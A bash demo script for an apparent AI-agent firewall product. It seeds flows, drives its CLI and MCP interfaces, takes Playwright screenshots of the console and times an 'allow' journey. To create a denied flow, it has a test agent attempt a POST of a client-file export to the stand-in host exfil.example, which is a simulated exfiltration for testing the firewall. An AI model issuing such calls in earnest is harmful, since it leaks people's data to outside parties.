#!/usr/bin/env bash
# Screenshots of every console screen on the LIVE demo (after demo/scenarios/run-all.sh), light and dark themes,
# 1440x900, with Playwright in its pinned image on the demo publish network (console/e2e/recette.spec.ts).
# Also times « Autoriser » from the journal in the console, end to end (until the agent gets through).
# Usage: demo/screenshots.sh [output dir]   (default docs/rapport/captures)
# shellcheck source=demo/lib.sh
. "$(dirname "$0")/lib.sh"
out="${1:-$ROOT/docs/rapport/captures}"
PLAYWRIGHT_IMAGE="${PLAYWRIGHT_IMAGE:-mcr.microsoft.com/playwright:v1.64.1-noble}"   # = @playwright/test of console/
api_healthy || die "the demo is not running (demo/up.sh)"
mkdir -p "$out" "$STATE_DIR/shots"
rm -f "$STATE_DIR/shots/"*.png "$STATE_DIR/allow-ui-timing.json"

# Fresh data: a tool call of daniel-bot refused (conversation, tool, message), a refusal of acme-bot to allow.
since="$(now_iso)"; conv="conv-recette-$(rand_hex 6)"
req="$(jqx -nc --arg c "$conv" '{tool: "fetch", conversation_id: $c, args: {url: "http://exfil.example/upload", method: "POST", body: "export du fichier clients (recette)"}}')"
dc exec -T daniel-bot curl -sS --max-time 30 -H 'content-type: application/json' -d "$req" "$DANIEL_RUN_URL" >/dev/null || die "daniel-bot /run failed"
agent_sh acme-bot "$(http_code_cmd https://api.github.com/zen)" >/dev/null || true
denied="$(find_flow "$(agent_id daniel-bot)" exfil.example deny "$since" 30 | jqx -r .id)" || die "no denied flow for daniel-bot"
allow="$(find_flow "$(agent_id acme-bot)" api.github.com deny "$since" 30 | jqx -r .id)" || die "no denied flow for acme-bot"
for _ in $(seq 1 30); do flow_detail "$denied" | jqx -e '.tool_call != null' >/dev/null 2>&1 && break; sleep 1; done
object="$(demo_id "$(did 108)")"
revision="$(api_get /revisions | items | jqx -s -r 'map(select(.number > 1)) | sort_by(.number) | .[0].number')"
info "denied flow $denied ($conv), flow to allow $allow, object $object, revision $revision"

# The three admin interfaces on the same flow, as an operator would (audit screenshot: ui, cli and mcp side by side):
# the CLI rotates the approved agent's token and opens the flow; the approved agent reads it through afw-mcp and
# prepares a rule in its delegated zone (then discards it); the console journey below adds the ui entries.
if cli_has logs show; then
  for old in $(api_get /tokens | items | jqx -r 'select(.role == "mcp_agent" and .revoked_at == null) | .id'); do afw tokens revoke "$old" >/dev/null; done
  mcp_token="$(afw tokens create --name "recette-mcp-$(rand_hex 4)" --role mcp_agent --agent daniel-bot --json | jqx -r '.secret')"
  afw logs show "$denied" >/dev/null
  # One message per second, like an MCP client waiting for each answer: afw-mcp handles requests concurrently,
  # so discard_session sent at once could run before open_session/create_resource.
  slow_lines() { for l in "$@"; do printf '%s\n' "$l"; sleep 1; done; }
  slow_lines '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"recette","version":"1"}}}' \
    '{"jsonrpc":"2.0","method":"notifications/initialized"}' \
    "$(jqx -nc --arg f "$denied" '{jsonrpc: "2.0", id: 2, method: "tools/call", params: {name: "get_flow", arguments: {flow_id: $f}}}')" \
    "$(jqx -nc '{jsonrpc: "2.0", id: 3, method: "tools/call", params: {name: "open_session", arguments: {name: "Recette : préparation par l agent agréé"}}}')" \
    "$(jqx -nc --arg id "$(python3 -c 'import uuid; print(uuid.uuid4())')" --arg z "$(demo_id "$(did 402)")" --arg d "$(demo_id "$(did 109)")" --arg s "$(demo_id "$(did 201)")" \
      '{jsonrpc: "2.0", id: 4, method: "tools/call", params: {name: "create_resource", arguments: {kind: "rules", resource: {id: $id, name: "Proposition MCP : stockage S3 pour clients", layer: {type: "zone", zone_id: $z}, position: 99, sources: [$z], destinations: [$d], services: [$s], data_classes: [], action: "accept", track: "detailed", enabled: true, comment: "préparée par l agent agréé, non publiée", section: null, expires_at: null}}}}')" \
    "$(jqx -nc '{jsonrpc: "2.0", id: 5, method: "tools/call", params: {name: "discard_session", arguments: {}}}')" |
    { cat; sleep 5; } | docker run --rm -i --network "${DEMO_PROJECT}_control" -e "$AFW_CLI_URL_ENV=$AFW_API_URL_IN_DOCKER" \
      -e "$AFW_CLI_TOKEN_ENV=$mcp_token" --entrypoint afw-mcp "$AFW_CLI_IMAGE" stdio >/dev/null 2>&1 || warn "afw-mcp get_flow failed"
  for sid in $(api_get /sessions | items | jqx -r 'select(.state == "open" and .interface == "mcp") | .id'); do
    api_post "/sessions/$sid/discard" >/dev/null || true
  done
fi

before_rev="$(latest_revision)"
# Watcher: the first moment acme-bot gets through to api.github.com (end of the timed « Autoriser » journey).
rm -f "$STATE_DIR/allow-ui-through"
( for _ in $(seq 1 600); do
    if [ "$(agent_sh acme-bot "$(http_code_cmd https://api.github.com/zen)" 2>/dev/null || true)" = 200 ]; then now_ms >"$STATE_DIR/allow-ui-through"; exit 0; fi
    sleep 0.5
  done ) &
watcher=$!
docker run --rm --network "${DEMO_PROJECT}_publish" --ipc=host \
  -v "$ROOT:/repo" -v "$STATE_DIR/shots:/out" -w /repo/console \
  -v afw-pnpm-store:/pnpm-store -e npm_config_store_dir=/pnpm-store -e HOME=/tmp -e CI=1 \
  -e AFW_RECETTE=1 -e AFW_RECETTE_OUT=/out -e AFW_E2E_CONSOLE=http://console:3000 -e AFW_E2E_TOKEN="$AFW_TOKEN" \
  -e AFW_RECETTE_DENIED_FLOW="$denied" -e AFW_RECETTE_ALLOW_FLOW="$allow" -e AFW_RECETTE_AGENT="$(agent_id daniel-bot)" \
  -e AFW_RECETTE_OBJECT="$object" -e AFW_RECETTE_REVISION="$revision" \
  "$PLAYWRIGHT_IMAGE" bash -c 'corepack enable >/dev/null 2>&1 && pnpm install --frozen-lockfile --ignore-scripts >/dev/null &&
    pnpm exec playwright test -c e2e/playwright.config.ts e2e/recette.spec.ts' || die "Playwright failed"
mv "$STATE_DIR/shots/allow-ui-timing.json" "$STATE_DIR/allow-ui-timing.json" || die "no timing of the Autoriser journey"

# End of the timed journey: the agent gets through.
for _ in $(seq 1 60); do [ -s "$STATE_DIR/allow-ui-through" ] && break; sleep 1; done
kill "$watcher" 2>/dev/null || true
[ -s "$STATE_DIR/allow-ui-through" ] || die "acme-bot never got through after the console journey"
jqx --argjson t2 "$(cat "$STATE_DIR/allow-ui-through")" '. + {agent_through_ms: $t2, total_ms: ($t2 - .started_ms)}' \
  "$STATE_DIR/allow-ui-timing.json" >"$STATE_DIR/allow-ui-timing.json.tmp" && mv "$STATE_DIR/allow-ui-timing.json.tmp" "$STATE_DIR/allow-ui-timing.json"
info "Autoriser (console): $(jqx -c . "$STATE_DIR/allow-ui-timing.json")"

# Restore the demo policy (remove the rule added through the console).
rid="$(api_get /rules | items | jqx -r 'select(.name | test("api\\.github\\.com")) | select(.layer.type == "zone" and .layer.zone_id == "'"$(demo_id "$(did 402)")"'") | .id' | head -n1)"
if [ -n "$rid" ] && [ "$(latest_revision)" != "$before_rev" ]; then
  session_open; delete_rule "$rid"; publish_and_install "Recette : retrait de la règle ajoutée depuis la console" >/dev/null
fi
cp "$STATE_DIR/shots/"*.png "$out/"
info "screenshots: $out ($(find "$STATE_DIR/shots" -name '*.png' | wc -l | tr -d ' ') files)"
